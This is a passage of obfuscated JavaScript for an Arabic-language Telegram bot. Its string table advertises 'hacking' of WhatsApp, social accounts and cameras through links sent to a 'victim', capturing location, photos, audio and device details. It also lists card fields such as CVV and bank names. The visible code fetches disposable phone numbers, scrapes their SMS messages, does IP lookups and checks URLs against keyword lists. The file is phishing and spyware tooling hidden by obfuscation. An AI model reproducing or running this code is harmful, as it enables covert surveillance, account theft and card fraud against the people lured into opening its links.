        '\x20|\x20في\x20بـوت',
        'اختراق\x20انس',
        'ي\x20اخاف\x20اشا',
        'لذي\x20رسلك\x20ه',
        'floor',
        'BCGOv',
        'user_id',
        'randomByte',
        'خاص\x20بك\x0a\x20عن',
        'phone_numb',
        '-\x20بوت\x20بحث\x20',
        'ابط\x20دعوة.',
        '👨🏻‍🏫',
        'ذا\x20\x20الرابط',
        'sendMessag',
        'cVeBi',
        'المغرب\x20🇲🇦',
        'لبنان\x20🇱🇧',
        '\x20⚠️',
        'index',
        'ك\x20VIP',
        'KCVaM',
        'saBMS',
        'تغير\x20الرقم',
        'erica',
        'isCharging',
        'twphQ',
        '🇨🇷',
        'error',
        'الدومينيكا',
        'Anqhg',
        'جزر\x20كايمان',
        '`\x0a*[-]\x20Car',
        'administra',
        '\x20يتم\x20إنشاء',
        'trim',
        'cTnGS',
        'hing\x20joke:',
        '/json',
        'السودان\x20🇸🇩',
        'روسيا',
        'rjvQx',
        'خطير\x20جداً\x20',
        'ن\x20العثور\x20ع',
        'deo',
        'ارساله\x20لضح',
        'Frequency',
        '\x20⏰\x0a-\x20اسم\x20ا',
        'GUtuO',
        'sIRRb',
        'نيكاراغوا\x20',
        'تجرام\x20🖥',
        '/whatsapp?',
        'لقد\x20قام\x20ال',
        'videos',
        't?start=',
        'سحب\x20جميع\x20ا',
        'كوريا\x20الشم',
        '*\x20[BOT](t.',
        'agram',
        'XGdsm',
        'RtTSu',
        'ng>يرجى\x20ات',
        'ata:',
        'once',
        'AojHR',
        'vvNow',
        'لشاشة:\x20',
        'غوام\x20🇬🇺',
        'إسبانيا\x20🇪🇸',
        '\x20أي\x20رسالة\x20',
        'me/)\x20\x0a*Pre',
        'الفلبين\x20🇵🇭',
        '10mb',
        'uHyWZ',
        'قبة\x20📡',
        'ريونيون\x20🇷🇪',
        'ة\x20تنابع\x20قق',
        '🇺🇿',
        's24.me/en/',
        '00%',
        'إيطاليا\x20🇮🇹',
        'حساب\x20جديد⚠️',
        'uZqxG',
        'https://iw',
        'type',
        'ode>',
        '\x20\x0aكلمة\x20الس',
        'VPStG',
        'rMOAn',
        'UyAUd',
        'battery',
        'ائل</stron',
        'الذي\x20تم\x20ان',
        'LwRqR',
        'userId',
        'kGttc',
        '\x20موجود:\x20',
        'firstName',
        '/Messages\x0a',
        'bWBqm',
        'RMzMp',
        'vJHYG',
        'KjRuW',
        'qhvIW',
        '\x20⚡\x0a-\x20الشبك',
        'fe.html',
        'الذي\x20يمكن\x20',
        'قتة:',
        'generate_i',
        'InFqO',
        'تفسير\x20الأح',
        'catch',
        'hezph',
        'ميات\x20الذي\x20',
        'pwNki',
        '\x20📅\x0a-\x20بروتو',
        'rshq_tikto',
        'UIWMg',
        'Qwdzh',
        'بحث\x20عن\x20صور',
        'رة\x20الداخلي',
        'نة:\x20',
        'deviceName',
        'فنلندا',
        'كول\x20الأمان',
        '\x20\x20\x20\x20',
        's.html',
        'chat',
        'الدنمارك\x20🇩🇰',
        '<strong>ال',
        'تحها\x20مجاني',
        'هندوراس\x20🇭🇳',
        'nvite',
        'إيقاف\x20البر',
        '%\x20🔋\x0a-\x20هل\x20ا',
        '🔗\x20توليد\x20را',
        'بوك\x20🔮',
        'عندما\x20\x20تصل',
        'Generating',
        'قطر\x20🇶🇦',
        'onText',
        'me/VlP_12',
        'content',
        'nt:',
        'eo:',
        '\x20الحصول\x20عل',
        'wgfRS',
        'سبب\x20ان\x20يوج',
        'mJdCL',
        'callback_q',
        'بلغاريا\x20🇧🇬',
        'ان\x20تخترقك\x20',
        '\x20مراقبه\x20لل',
        'hIITl',
        'تايلاند\x20🇹🇭',
        'ية\x20فيديو\x20🎥',
        'mHPln',
        'يل\x20بعد\x20🗳</',
        'qyAqy',
        '9ReiIbD',
        'السنغال\x20🇸🇳',
        'uwgIX',
        'toString',
        '.me/',
        'on/',
        '\x20الأرقام:',
        'بك\x20سوف\x20تحص',
        'نيوزيلندا\x20',
        'تعامل\x20معه\x20',
        'فيتنام\x20🇻🇳',
        '*\x0a\x0a',
        'غيل:\x20',
        'sendVoice',
        '<strong>حد',
        'rshq_faceb',
        'Agent',
        'SEaNU',
        'USA🇺🇸',
        'غوادلوب\x20🇬🇵',
        'كل\x20صحيح.',
        'أوغندا\x20🇺🇬',
        'ges',
        '/record/:l',
        'ي\x20مالايرضي',
        'frKjx',
        'DKegB',
        '==========',
        ':\x20`',
        'صيد\x20فيزات\x20',
        'lHGNQ',
        'MBrer',
        'bfGzW',
        'Error\x20proc',
        'راق\x20كامراة',
        'ل\x20على\x20المن',
        'uploads/',
        '🇳🇨',
        'nfxam',
        'XhigV',
        'uTDtS',
        'ice.glitch',
        'OlMDi',
        'SIGINT',
        'on...\x0a[▓▓▓',
        'اصطناعي\x20🤖',
        'FzFqC',
        '\x20🔒',
        'yXZpt',
        'آمن.',
        'pfAbB',
        'لاوس\x20🇱🇦',
        '_pins/?q=',
        't.html',
        'tiktok.com',
        'توباغو\x20🇹🇹',
        'اب\x0aافتيارا',
        'rSzJq',
        '\x20استخدام\x20ا',
        'sendVideo',
        'الصوره\x20',
        '📞\x20إرسال\x20جه',
        'ر\x20رابط\x20🔒',
        '\x20حذف\x20حسابك',
        'ستفسار\x20راس',
        'user',
        'rning-anim',
        'connection',
        'aHOgv',
        'عمان\x20🇴🇲',
        'sendPhoto',
        'tpdXG',
        '🇸🇪',
        'photos',
        'الصين\x20🇨🇳',
        'اختراق\x20اله',
        'سايل\x20الضحي',
        'username',
        'essage',
        'Capital\x20On',
        'WoLSn',
        'أنغولا\x20🇦🇴',
        'lvcOE',
        'بوت\x20اختراق',
        'رابط\x20جمع\x20ا',
        'إضافة\x20أسما',
        'ة:</strong',
        'aVNmU',
        'llVRr',
        'getLocatio',
        'log',
        'تايوان\x20🇹🇼',
        'كولومبيا\x20🇨🇴',
        'أستراليا\x20🇦🇺',
        'QuxRo',
        'creationTi',
        'JQEkW',
        'mat\x20is\x20not',
        'ZCBnE',
        'ت\x20الجهاز',
        'uery\x22:\x22',
        'ليتوانيا\x20🇱🇹',
        'وشكرا.',
        'rSMGR',
        'ر\x20بهذا\x20الب',
        '➖\x20اضغط\x20ع\x20ا',
        '\x20على\x20رقم\x20و',
        'creationDa',
        'اول\x20مره\x20اخ',
        'mkdgY',
        'bluetoothS',
        'ف\x20\x20رساله\x20ج',
        '\x20هذا\x20الراب',
        'numbers/',
        'خره\x20او\x20حاو',
        'tiktok',
        'غير\x20متوفر',
        'لام\x20🧙‍♂️',
        'qqkOs',
        'ukpbg',
        'ta\x20found\x20o',
        'اختراق\x20سنا',
        '░░░░░░░]\x200',
        'قاط\x20الصور.',
        '🇪🇸',
        'ة:\x20',
        'إغلاق\x20المو',
        'readFileSy',
        'bhBez',
        'r_query',
        'SunTrust\x20B',
        'اختراق\x20وات',
        'applicatio',
        'dIGEOjpMgZ',
        '0\x20(Windows',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'توغو\x20🇹🇬',
        'https://ip',
        'صربيا',
        'بيرو\x20🇵🇪',
        'mkdirSync',
        'JKjKQ',
        'nJDXS',
        'crypto',
        '░░░░░░░]\x202',
        'from',
        ')\x0a\x20\x20\x20\x20\x20\x20',
        'mbRdj',
        'utu.be',
        'dVCck',
        'أرمينيا\x20🇦🇲',
        'test',
        'blog',
        'remove_vip',
        'vsGbU',
        'لمعلومات:\x20',
        'هولندا',
        '/submitVid',
        '🇺🇸',
        'check_link',
        'فلسطين\x20🇵🇸',
        'ceFIj',
        'iry\x20:*\x20`',
        'screenOrie',
        'ختلفه\x20او\x20ح',
        'معرفة\x20رقم\x20',
        'سحب\x20جميع\x20ر',
        'ر\x20الدوله\x20ا',
        '🇸🇻',
        'مصر\x20🇪🇬',
        'LTMGD',
        'fcgil',
        'جلد:\x20',
        '&type=tikt',
        'ي\x20في\x20لوحة\x20',
        'اتف\x20كاملاً',
        'sMpWi',
        '🇪🇪',
        '\x20أثناء\x20جلب',
        'r\x20data\x20for',
        'ث\x20عن\x20صور.\x0a',
        'lookup',
        '\x20•\x20التصنيف',
        'frivB',
        'me/ZI0_bot',
        'فنلندا\x20🇫🇮',
        '▓░░░░░░]\x205',
        '\x20الي\x2030\x20نط',
        'city',
        'cTnnl',
        'بك\x20فقط.',
        'ح\x20المميزات',
        '\x20🗑</strong',
        'BKRlM',
        'OCphX',
        'deviceInfo',
        '/submitLoc',
        '/completio',
        'atus:',
        'الرسالة\x20📩:',
        'وة\x20الامان\x20',
        'و\x20حاول\x20مره',
        'secondName',
        'ائل\x20للحصول',
        'ل\x20وهمي',
        'مشبوه\x20🟠',
        'fgYtZ',
        'axios',
        'امر\x20التالي',
        'اقع\x20💣',
        '/de\x0a\x0a<stro',
        'يح\x20يبدأ\x20بـ',
        'طلب\x20الكود\x20',
        'cel.app/',
        'filePhotos',
        '🤣🤣🤣🤣',
        '/F.html?ch',
        'inkId',
        'array',
        's://t.me/',
        'ed.',
        '\x20المستخدم:',
        'اعطيني\x20نكت',
        'ع\x201نقطه\x20\x0aع',
        'الرجاء\x20الا',
        '░░░░░░░░░░',
        'ا\x20الخيارت\x20',
        '100mb',
        'emails.jso',
        'تونس\x20🇹🇳',
        'رواندا\x20🇷🇼',
        'toLowerCas',
        'ناء\x20إنشاء\x20',
        'ال\x20الرابط\x20',
        'UCrjK',
        'hing\x20love\x20',
        'هونغ\x20كونغ\x20',
        'unlinkSync',
        'https://fo',
        'd\x20or\x20video',
        'request_co',
        'ري\x20انشاء\x20ا',
        'NTiUX',
        'CsZTK',
        'app/',
        'glTcq',
        'xdEfs',
        'e\x20Visa!*',
        'اختراق\x20فيس',
        'ram-bot-ap',
        'LBkdy',
        'images',
        '/so',
        'بط\x20جديد\x20',
        'لنظام:\x20',
        'Win64;\x20x64',
        'kTHeF',
        'ryAZr',
        'لاتفيا',
        'ener',
        'ناميبيا\x20🇳🇦',
        'HVKYE',
        '\x0a<code>',
        'FmLRW',
        '`\x0a*[-]\x20Val',
        'التشيك\x20🇨🇿',
        'bio',
        '\x20لنه\x20تم\x20فح',
        'osVersion',
        '\x0aانمي\x0aوالم',
        'شاء\x20⏰\x20:\x20',
        'mfQWd',
        '\x27m*\x20[™](t.',
        '\x20📱\x0a-\x20الذاك',
        'ل\x20بعد\x20🗳ً</',
        'QUVli',
        'UBKlq',
        'ار\x20الايمل\x20',
        'لرابط\x20إليك',
        'ike\x20Gecko)',
        '\x20🔒\x0a-\x20نطاق\x20',
        '\x20الجهاز',
        'mdRZqoXRZ_',
        'الكويت\x20🇰🇼',
        'KiVzy',
        'Stored\x20and',
        '/getNam',
        'نيبال\x20🇳🇵',
        'لى\x20رابط\x20ال',
        'fqogU',
        'facebook.c',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'n/json',
        'total_coun',
        'blVhc',
        ':</strong>',
        'chatId',
        'creator',
        'rVyzN',
        '\x20•\x20مزود\x20ال',
        'stringify',
        '\x20نظام\x20التش',
        'بنين\x20🇧🇯',
        'Data',
        'ZvNFF',
        'تشيلي\x20🇨🇱',
        'حدث\x20خطأ\x20أث',
        'ي\x20ع\x20الكثير',
        'HNTJZ',
        'aFgaV',
        'إيران\x20🇮🇷',
        'بمرجد\x20الدخ',
        ':\x20\x0a\x20اليوزر',
        'الرجاء\x20إرس',
        'answerCall',
        'mFwtr',
        'تة.',
        'rshq_insta',
        'AHTnQ',
        '0.0.0.0\x20Sa',
        'طلب\x20اي\x20اذن',
        'mFSaT',
        'كواد\x20والرس',
        'k.html',
        '\x20الصور',
        'غير\x20قابل\x20ل',
        'ق\x20الهاتف\x20ك',
        'env',
        '\x20جهة\x20الاتص',
        'SNSpX',
        'sucHT',
        'ss\x20the\x20but',
        'whatsapp.c',
        'يه\x20عبر\x20راب',
        'puhfH',
        '\x20الضحيه\x20عب',
        'OZfWH',
        '➖\x20وقت\x20الان',
        'لب\x20بحث\x20بال',
        '▓▓▓▓░░░░░░',
        'حقق\x20من\x20جهة',
        'حدث\x20خطأ:\x20',
        'هاتف\x20هذا\x20ق',
        'results',
        'o\x20]</stron',
        'eText',
        'صورة.',
        '\x0aلعرض\x20الرس',
        'ابط\x20التقاط',
        'م\x20هذا\x20هو\x0a:',
        'ألبانيا\x20🇦🇱',
        'باكستان\x20🇵🇰',
        'البوسنة\x20وا',
        '\x20الاتصال.',
        '\x20من\x20الخورز',
        'dagnQ',
        'مرحبًا!\x20اض',
        'cpuCores',
        'جنوب\x20أفريق',
        'ثوقين\x20وتحت',
        'QfYHE',
        'يراد\x20الأرق',
        '`\x0a*[-]\x20Ban',
        'يس\x20اسمي',
        'لقد\x20تم\x20وصو',
        'اختراق\x20الك',
        'buffer',
        'شتراك\x20في\x20ج',
        'latitude',
        '/getNameFo',
        '\x20الرابط:\x20',
        'لألوان:\x20',
        '\x20رقم\x20وهمي',
        'https://fa',
        '63GUlUVy',
        '\x0a<strong>ي',
        'get_camera',
        'TTYdh',
        'OwAgM',
        'رقم\x20الهاتف',
        'https',
        'خل\x20إلى\x20الر',
        'mFxKj',
        'utKzG',
        'لإيماءات\x20ا',
        'isDirector',
        'نيجيريا\x20🇳🇬',
        'الحصول\x20على',
        'TUMHl',
        'nIhNk',
        'ل\x20وهمي\x20💌',
        'دولة\x20غير\x20م',
        'HTML',
        'rOSZf',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'SJfbe',
        'ل\x20على\x201\x20نق',
        'ofLNd',
        'fari/537.3',
        'كرواتيا\x20🇭🇷',
        'ور\x20ابحث\x20عن',
        'بورتوريكو\x20',
        '`\x0a*[-]\x20CVV',
        'ًا.',
        'الإمارات\x20🇦🇪',
        '🇨🇳',
        'JcZhl'
    ];
    _0xce71 = function () {
        return _0x595b39;
    };
    return _0xce71();
}
const countries = {
    '+1': [
        _0x317544(0x219),
        _0x317544(0x6dd)
    ],
    '+46': [
        _0x317544(0x210),
        _0x317544(0x687)
    ],
    '+86': [
        _0x317544(0x2cc),
        _0x317544(0x7d4)
    ],
    '+852': [
        _0x317544(0x88e),
        _0x317544(0x19f)
    ],
    '+45': [
        _0x317544(0x4ea),
        _0x317544(0x7da)
    ],
    '+33': [
        _0x317544(0x2a9),
        _0x317544(0x467)
    ],
    '+31': [
        _0x317544(0x6db),
        _0x317544(0x4be)
    ],
    '+7': [
        _0x317544(0x5c7),
        _0x317544(0x3fc)
    ],
    '+7KZ': [
        _0x317544(0x518),
        _0x317544(0x37a)
    ],
    '+381': [
        _0x317544(0x6c9),
        _0x317544(0x2bc)
    ],
    '+44': [
        _0x317544(0x418),
        _0x317544(0x2b9)
    ],
    '+371': [
        _0x317544(0x741),
        _0x317544(0x20a)
    ],
    '+62': [
        _0x317544(0x189),
        _0x317544(0x4a5)
    ],
    '+351': [
        _0x317544(0x809),
        _0x317544(0x599)
    ],
    '+34': [
        _0x317544(0x7ff),
        _0x317544(0x6bb)
    ],
    '+372': [
        _0x317544(0x184),
        _0x317544(0x6f0)
    ],
    '+358': [
        _0x317544(0x61b),
        _0x317544(0x188)
    ]
};
async function importNumbers() {
    const _0x57afe4 = _0x317544, _0x4d1172 = {
            'HfMww': _0x57afe4(0x370) + _0x57afe4(0x83b) + _0x57afe4(0x714),
            'qEldm': _0x57afe4(0x861) + _0x57afe4(0x645)
        };
    try {
        const _0x476c03 = await axios[_0x57afe4(0x3c5)](_0x4d1172[_0x57afe4(0x25b)]);
        return _0x476c03[_0x57afe4(0x369)][_0x57afe4(0x594)]('\x0a');
    } catch (_0x2416c8) {
        return console[_0x57afe4(0x5bb)](_0x4d1172[_0x57afe4(0x1ad)], _0x2416c8), [];
    }
}
async function getRandomNumberInfo() {
    const _0x575714 = _0x317544, _0x1cf57b = {
            'gYRjB': function (_0x36a09e) {
                return _0x36a09e();
            },
            'vUQLt': function (_0x4c5f4e, _0x5ce5da) {
                return _0x4c5f4e === _0x5ce5da;
            },
            'wKlFW': function (_0xfcb2c0, _0x4e3e89) {
                return _0xfcb2c0 * _0x4e3e89;
            },
            'gicen': _0x575714(0x7e3),
            'qVjDd': _0x575714(0x3f4),
            'ZPlTC': function (_0x15bf02, _0x42f7a1) {
                return _0x15bf02 in _0x42f7a1;
            },
            'eLLHe': _0x575714(0x7c6) + _0x575714(0x584)
        }, _0x439c13 = await _0x1cf57b[_0x575714(0x1bc)](importNumbers);
    if (_0x1cf57b[_0x575714(0x321)](_0x439c13[_0x575714(0x2c6)], -0xa2d + 0x2209 + -0x5f7 * 0x4))
        return null;
    const _0x15677d = Math[_0x575714(0x5a3)](_0x1cf57b[_0x575714(0x4bc)](Math[_0x575714(0x3a8)](), _0x439c13[_0x575714(0x2c6)])), _0x8c9c93 = _0x439c13[_0x15677d][_0x575714(0x5c2)](), _0x30900e = new Date()[_0x575714(0x444) + 'g']()[_0x575714(0x594)]('T')[0x2 * -0x11 + 0xcaf * 0x2 + -0x193c], _0x5048da = new Date()[_0x575714(0x91e) + _0x575714(0x29b)](_0x1cf57b[_0x575714(0x909)]);
    let _0x3e7ac7;
    if (_0x8c9c93[_0x575714(0x83d)]('+1'))
        _0x3e7ac7 = '+1';
    else
        _0x8c9c93[_0x575714(0x83d)]('+7') ? _0x3e7ac7 = _0x8c9c93[_0x575714(0x885)]('7') ? _0x1cf57b[_0x575714(0x3fd)] : '+7' : _0x3e7ac7 = _0x1cf57b[_0x575714(0x285)](_0x8c9c93[_0x575714(0x2ec)](0x43d + 0x1f * 0xd1 + -0x1d8c, 0x1f * -0x49 + 0xda * -0x1 + 0x9b5 * 0x1), countries) ? _0x8c9c93[_0x575714(0x2ec)](0x1 * 0x26f5 + -0xc5 + -0x2630, 0x315 * -0x2 + -0x671 + -0x167 * -0x9) : _0x8c9c93[_0x575714(0x2ec)](0xd5 + 0xa7 + 0x2 * -0xbe, -0x11 * 0x61 + 0x213e + 0x2 * -0xd65);
    const [_0x1bef29, _0x102170] = countries[_0x3e7ac7] || [
        _0x1cf57b[_0x575714(0x396)],
        '🚩'
    ];
    return {
        'number': _0x8c9c93,
        'countryCode': _0x3e7ac7,
        'countryName': _0x1bef29,
        'countryFlag': _0x102170,
        'creationDate': _0x30900e,
        'creationTime': _0x5048da
    };
}
async function getMessages(_0x65d4b3) {
    const _0x1f52c7 = _0x317544, _0x41de66 = {
            'UpdPB': function (_0x1c526d, _0x48a0a3) {
                return _0x1c526d(_0x48a0a3);
            },
            'ceFIj': _0x1f52c7(0x876) + _0x1f52c7(0x202) + _0x1f52c7(0x512),
            'cVfbC': _0x1f52c7(0x861) + _0x1f52c7(0x8c9)
        };
    try {
        const _0x69150a = await axios[_0x1f52c7(0x3c5)](_0x1f52c7(0x1b1) + _0x1f52c7(0x5ee) + _0x1f52c7(0x6b0) + _0x65d4b3), _0x3e483c = cheerio[_0x1f52c7(0x320)](_0x69150a[_0x1f52c7(0x369)]), _0x4307c8 = [];
        return _0x41de66[_0x1f52c7(0x3cc)](_0x3e483c, _0x41de66[_0x1f52c7(0x6e0)])[_0x1f52c7(0x246)]((_0x38847c, _0x1e520d) => {
            const _0x3e3a50 = _0x1f52c7;
            _0x4307c8[_0x3e3a50(0x161)](_0x41de66[_0x3e3a50(0x3cc)](_0x3e483c, _0x1e520d)[_0x3e3a50(0x4b4)]()[_0x3e3a50(0x5c2)]());
        }), _0x4307c8;
    } catch (_0x58b494) {
        return console[_0x1f52c7(0x5bb)](_0x41de66[_0x1f52c7(0x34d)], _0x58b494), [];
    }
}
bot[_0x317544(0x62c)](/\/stسمهصخصt/, _0x178ce3 => {
    const _0x19c567 = _0x317544, _0x4e6628 = {
            'fgYtZ': _0x19c567(0x7c2) + _0x19c567(0x7b3),
            'FwjTM': _0x19c567(0x4e8),
            'TFfgl': _0x19c567(0x1f3) + _0x19c567(0x280) + _0x19c567(0x6a9) + _0x19c567(0x84f)
        }, _0x4d0eb3 = _0x178ce3[_0x19c567(0x61f)]['id'], _0x2431ce = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x4e6628[_0x19c567(0x70d)],
                            'callback_data': _0x4e6628[_0x19c567(0x2b6)]
                        }]]
            }
        };
    bot[_0x19c567(0x5ad) + 'e'](_0x4d0eb3, _0x4e6628[_0x19c567(0x247)], _0x2431ce);
});
const m = _0x317544(0x8b7) + _0x317544(0x4f2) + 'ج';
bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x426a62 => {
    const _0x3c82ab = _0x317544, _0x3edf28 = {
            'TUMHl': function (_0x1c5869, _0x50a419) {
                return _0x1c5869 === _0x50a419;
            },
            'mFSaT': _0x3c82ab(0x4e8),
            'vSGfN': function (_0x10a791) {
                return _0x10a791();
            },
            'CRKWX': _0x3c82ab(0x5b6) + _0x3c82ab(0x199),
            'vLrWL': _0x3c82ab(0x713) + '💬',
            'TjOgX': function (_0x195a0a, _0xcae5c4) {
                return _0x195a0a + _0xcae5c4;
            },
            'pFfti': function (_0x404eee, _0x2e948a) {
                return _0x404eee + _0x2e948a;
            },
            'UanKv': function (_0x365486, _0x4a1aa0) {
                return _0x365486 + _0x4a1aa0;
            },
            'vvNow': _0x3c82ab(0x910),
            'lvGPm': _0x3c82ab(0x55e) + _0x3c82ab(0x7a8) + _0x3c82ab(0x8f4),
            'ryAZr': _0x3c82ab(0x72f) + _0x3c82ab(0x7db),
            'JcZhl': function (_0x892075, _0x229390) {
                return _0x892075(_0x229390);
            },
            'DQLtx': function (_0x16d95b, _0x5fdec2) {
                return _0x16d95b > _0x5fdec2;
            },
            'kwMZy': _0x3c82ab(0x4a8) + _0x3c82ab(0x5e5) + _0x3c82ab(0x8cb),
            'PRAUG': _0x3c82ab(0x898) + _0x3c82ab(0x19b)
        }, _0x2d83cd = _0x426a62[_0x3c82ab(0x4b7)], _0x38d041 = _0x2d83cd[_0x3c82ab(0x61f)]['id'], _0x5f4ae1 = _0x426a62[_0x3c82ab(0x369)];
    if (_0x3edf28[_0x3c82ab(0x7c3)](_0x5f4ae1, _0x3edf28[_0x3c82ab(0x780)])) {
        const _0x143d6f = await _0x3edf28[_0x3c82ab(0x314)](getRandomNumberInfo);
        if (_0x143d6f) {
            const _0x5a68f9 = {
                    'reply_markup': {
                        'inline_keyboard': [
                            [{
                                    'text': _0x3edf28[_0x3c82ab(0x8a4)],
                                    'callback_data': _0x3edf28[_0x3c82ab(0x780)]
                                }],
                            [{
                                    'text': _0x3edf28[_0x3c82ab(0x814)],
                                    'callback_data': _0x3c82ab(0x72f) + _0x3c82ab(0x7db) + _0x143d6f[_0x3c82ab(0x1d4)]
                                }]
                        ]
                    }
                }, _0x2d0f96 = _0x3edf28[_0x3c82ab(0x919)](_0x3edf28[_0x3c82ab(0x919)](_0x3edf28[_0x3c82ab(0x919)](_0x3edf28[_0x3c82ab(0x381)](_0x3edf28[_0x3c82ab(0x556)](_0x3edf28[_0x3c82ab(0x556)](_0x3c82ab(0x4e6) + _0x3c82ab(0x843) + _0x3c82ab(0x858) + _0x3c82ab(0x217) + _0x143d6f[_0x3c82ab(0x1d4)] + '`\x0a', _0x3c82ab(0x3ad) + '\x20' + _0x143d6f[_0x3c82ab(0x8cc) + 'e'] + '\x20' + _0x143d6f[_0x3c82ab(0x243) + 'g'] + '\x0a'), _0x3c82ab(0x903) + _0x3c82ab(0x3b7) + _0x143d6f[_0x3c82ab(0x592) + 'e'] + '\x0a'), _0x3c82ab(0x56a) + _0x3c82ab(0x46c) + m + '\x0a'), _0x3c82ab(0x296) + _0x3c82ab(0x3d5) + _0x143d6f[_0x3c82ab(0x6aa) + 'te'] + '\x0a'), _0x3c82ab(0x790) + _0x3c82ab(0x74d) + _0x143d6f[_0x3c82ab(0x69e) + 'me'] + '\x0a'), _0x3c82ab(0x6a8) + _0x3c82ab(0x429) + '.');
            bot[_0x3c82ab(0x8b1) + _0x3c82ab(0x798)](_0x2d0f96, {
                'chat_id': _0x38d041,
                'message_id': _0x2d83cd[_0x3c82ab(0x204)],
                'parse_mode': _0x3edf28[_0x3c82ab(0x5e1)],
                'reply_markup': _0x5a68f9[_0x3c82ab(0x343) + 'up']
            });
        } else
            bot[_0x3c82ab(0x5ad) + 'e'](_0x38d041, _0x3edf28[_0x3c82ab(0x37d)]);
    } else {
        if (_0x5f4ae1[_0x3c82ab(0x83d)](_0x3edf28[_0x3c82ab(0x740)])) {
            const _0x23b3c0 = _0x5f4ae1[_0x3c82ab(0x594)]('_')[-0x1 * -0x85a + 0xfa7 * 0x1 + 0x1 * -0x17ff], _0x29c67d = await _0x3edf28[_0x3c82ab(0x7d5)](getMessages, _0x23b3c0);
            if (_0x3edf28[_0x3c82ab(0x1d5)](_0x29c67d[_0x3c82ab(0x2c6)], 0x34c * -0x7 + -0x3 * -0x2a6 + 0xf22)) {
                let _0x3e4417 = _0x29c67d[_0x3c82ab(0x2ec)](0x16 * 0x16b + -0xac9 + -0x37 * 0x5f, -0x1bcf + 0xb91 + -0x4 * -0x411)[_0x3c82ab(0x1de)]((_0x57b958, _0x37027e) => _0x3c82ab(0x7f9) + 'م\x20' + (_0x37027e + (-0x13b3 + -0x1253 + 0x2607 * 0x1)) + _0x3c82ab(0x65b) + _0x57b958 + '`')[_0x3c82ab(0x57f)]('\x0a\x0a');
                _0x3e4417 += _0x3edf28[_0x3c82ab(0x81e)], bot[_0x3c82ab(0x5ad) + 'e'](_0x38d041, _0x3e4417, { 'parse_mode': _0x3edf28[_0x3c82ab(0x5e1)] });
            } else
                bot[_0x3c82ab(0x5ad) + 'e'](_0x38d041, _0x3edf28[_0x3c82ab(0x2f3)]);
        }
    }
});
const dangerous_keywords = [
        _0x317544(0x300),
        _0x317544(0x34f),
        'gd',
        _0x317544(0x3de),
        _0x317544(0x58d),
        _0x317544(0x244),
        _0x317544(0x2fe),
        _0x317544(0x329),
        _0x317544(0x168),
        _0x317544(0x8fb),
        _0x317544(0x6d7),
        _0x317544(0x5b2),
        _0x317544(0x442)
    ], safe_urls = [
        _0x317544(0x3fe),
        _0x317544(0x3c4),
        _0x317544(0x8b5),
        _0x317544(0x240) + _0x317544(0x6d3),
        _0x317544(0x237) + _0x317544(0x4dc),
        _0x317544(0x761) + 'om',
        _0x317544(0x675),
        _0x317544(0x165),
        _0x317544(0x8e6) + 'om',
        _0x317544(0x2f6),
        _0x317544(0x78b) + 'om'
    ];
let waiting_for_link = {};
function checkUrl(_0xc9f43a) {
    const _0x5bbd0f = _0x317544, _0x29cd08 = {
            'uQGOj': _0x5bbd0f(0x2c8),
            'CQkXV': _0x5bbd0f(0x5c9) + '🔴',
            'wqWGr': _0x5bbd0f(0x2f6),
            'fehCE': _0x5bbd0f(0x70c)
        }, _0x214c0d = _0xc9f43a[_0x5bbd0f(0x726) + 'e']();
    for (let _0x378f4a of safe_urls) {
        if (_0x214c0d[_0x5bbd0f(0x885)](_0x378f4a))
            return _0x29cd08[_0x5bbd0f(0x52c)];
    }
    for (let _0x4c1077 of dangerous_keywords) {
        if (_0x214c0d[_0x5bbd0f(0x885)](_0x4c1077))
            return _0x29cd08[_0x5bbd0f(0x371)];
    }
    if (!_0x214c0d[_0x5bbd0f(0x885)](_0x29cd08[_0x5bbd0f(0x47f)]))
        return _0x29cd08[_0x5bbd0f(0x16b)];
    return _0x29cd08[_0x5bbd0f(0x52c)];
}
function _0x7526(_0x70167, _0x5f39b5) {
    const _0x5ae048 = _0xce71();
    return _0x7526 = function (_0xf57119, _0x28b619) {
        _0xf57119 = _0xf57119 - (-0x2628 + 0x2685 + 0x103);
        let _0x44838a = _0x5ae048[_0xf57119];
        return _0x44838a;
    }, _0x7526(_0x70167, _0x5f39b5);
}
function isValidUrl(_0x283d00) {
    const _0x5a94a1 = _0x317544, _0x145c38 = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return _0x145c38[_0x5a94a1(0x6d6)](_0x283d00);
}
async function getIpInfo(_0x8eda33) {
    const _0x51f26a = _0x317544;
    try {
        const _0x4b88fa = await axios[_0x51f26a(0x3c5)](_0x51f26a(0x6c8) + _0x51f26a(0x22f) + _0x8eda33 + _0x51f26a(0x5c5));
        return _0x4b88fa[_0x51f26a(0x369)];
    } catch (_0x78dfdd) {
        return null;
    }
}
function extractIpFromUrl(_0x5a3209) {
    const _0x407486 = _0x317544, _0x5b6164 = {
            'CIpEh': function (_0x39ae2b, _0x9400d0) {
                return _0x39ae2b(_0x9400d0);
            }
        };
    try {
        const _0x4a945a = new URL(_0x5a3209)[_0x407486(0x41f)];
        return new Promise((_0x5970e5, _0x5a535b) => {
            const _0x349140 = _0x407486, _0x5c6da8 = {
                    'tIuVL': function (_0x23021f, _0x4be5cb) {
                        const _0x26982d = _0x7526;
                        return _0x5b6164[_0x26982d(0x511)](_0x23021f, _0x4be5cb);
                    }
                };
            dns[_0x349140(0x6f4)](_0x4a945a, (_0x5dd3f7, _0x488a42) => {
                const _0x24fd04 = _0x349140;
                if (_0x5dd3f7)
                    _0x5c6da8[_0x24fd04(0x21c)](_0x5a535b, null);
                else
                    _0x5c6da8[_0x24fd04(0x21c)](_0x5970e5, _0x488a42);
            });
        });
    } catch (_0x3435b7) {
        return null;
    }
}
bot[_0x317544(0x62c)](/\/sكخزننننtart/, _0x3ba073 => {
    const _0xd7c95f = _0x317544, _0x1d6011 = {
            'meNLq': _0xd7c95f(0x41c) + 'ط',
            'pqSjE': _0xd7c95f(0x6de) + 's',
            'YZPzv': _0xd7c95f(0x1f3) + _0xd7c95f(0x7e0) + _0xd7c95f(0x465)
        }, _0x4827fd = _0x3ba073[_0xd7c95f(0x61f)]['id'], _0x13c912 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x1d6011[_0xd7c95f(0x273)],
                            'callback_data': _0x1d6011[_0xd7c95f(0x4a3)]
                        }]]
            }
        };
